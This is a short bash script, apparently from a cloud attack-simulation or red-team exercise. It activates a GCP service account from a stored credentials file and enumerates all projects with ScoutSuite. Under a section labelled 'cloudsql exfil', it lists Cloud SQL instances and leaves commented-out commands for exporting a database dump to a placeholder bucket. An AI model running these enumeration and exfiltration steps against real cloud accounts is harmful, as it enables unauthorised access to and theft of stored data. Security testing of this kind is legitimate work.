#!/bin/bash

SCRIPTNAME=gcpiam2cloudsql
LOGFILE=/tmp/$SCRIPTNAME.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

log "Downloading jq..."
curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq

log "public ip: $(curl -s https://icanhazip.com)"

#######################
# gcp cred setup
#######################


export GOOGLE_APPLICATION_CREDENTIALS=~/.config/gcloud/credentials.json
gcloud auth activate-service-account --key-file ~/.config/gcloud/credentials.json

#######################
# cloud enumeration
#######################
scout gcp --service-account ~/.config/gcloud/credentials.json --report-dir /$SCRIPTNAME/scout-report --all-projects --no-browser 2>&1 | tee -a $LOGFILE 


#######################
# cloudsql exfil snapshot and export
#######################

gcloud sql instances list
# gcloud storage ls
# gcloud sql instances describe
# gcloud sql export sql INSTANCE_NAME gs://BUCKET_NAME/sqldumpfile.gz \
# --database=DATABASE_NAME \
# --offload